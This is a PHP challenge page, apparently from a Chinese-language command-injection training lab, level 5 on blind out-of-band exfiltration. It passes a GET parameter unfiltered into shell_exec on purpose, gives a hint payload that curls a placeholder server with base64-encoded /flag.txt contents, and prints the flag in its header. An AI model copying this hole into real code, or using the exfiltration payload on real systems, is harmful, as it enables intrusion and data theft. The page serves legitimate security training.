<?php
/**
 * 命令注入 L5 - 无回显外带 (OOB)
 * 注入上下文: ping -c 1 $input >/dev/null (无回显，需外带)
 * WAF难点: 盲命令执行无回显，攻击走 DNS/HTTP 外带，WAF 难以关联因果
 * 成功标志: 通过 DNS/HTTP 外带方式读取 /flag.txt 第五行 flag{cmdi_l5_00b_3xf1ltr4t10n}
 */

$cmd = $_GET['cmd'] ?? '127.0.0.1';

// ⚠️ 纯漏洞代码，不做任何过滤
// 输出重定向到 /dev/null，完全无回显
$output = shell_exec("ping -c 1 " . $cmd . " >/dev/null 2>&1");
$cmdOutput = $output ?? '';

// 始终返回相同的结果（无结果差异可判断）
$pingSuccess = ($output !== false);

?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>CMDi L5 - 无回显外带</title>
    <style>
        body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
        h2 { color: #e94560; }
        .info { background: #16213e; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #e94560; }
        .code { background: #0f3460; padding: 10px; border-radius: 3px; color: #53d769; }
        .result { padding: 20px; text-align: center; font-size: 18px; }
        input[type="text"] { width: 300px; padding: 10px; font-size: 16px; background: #0f3460; border: 1px solid #333; color: #e0e0e0; }
        input[type="submit"] { padding: 10px 20px; font-size: 16px; background: #e94560; border: none; color: white; cursor: pointer; }
    </style>
</head>
<body>
    <h2>🔫 命令注入 L5 — 无回显外带 (OOB)</h2>
    <div class="info">
        <strong>说明:</strong> Ping 工具，输出重定向到 /dev/null，完全无回显。<br>
        <strong>目标:</strong> 通过 DNS/HTTP 外带方式读取 <code>/flag.txt</code><br>
        <strong>命令:</strong> <span class="code">ping -c 1 <?php echo htmlspecialchars($cmd); ?> >/dev/null 2>&1</span><br>
        <strong>提示:</strong> 使用 backtick 嵌套执行，将 flag 内容拼入 DNS 查询域名进行外带<br>
        <small>例: `curl http://yourserver/$(cat /flag.txt|base64)`</small>
    </div>

    <form method="GET">
        <input type="text" name="cmd" value="<?php echo htmlspecialchars($cmd); ?>" placeholder="IP地址 (如: 127.0.0.1)">
        <input type="submit" value="Ping">
    </form>

    <?php include '../success-banner.php'; ?>
    <div class="result">
        <?php echo $pingSuccess ? '✅ Ping 已发送' : '❌ 执行失败'; ?>
    </div>
    <p style="color:#666; text-align:center; font-size:12px;">无论输入什么，都只显示 Ping 已发送。结果被重定向到 /dev/null。</p>

    <p><a href="../index.php" style="color:#53d769;">← 返回主页</a></p>
<?php include '../waf-status.php'; ?>
</body>
</html>
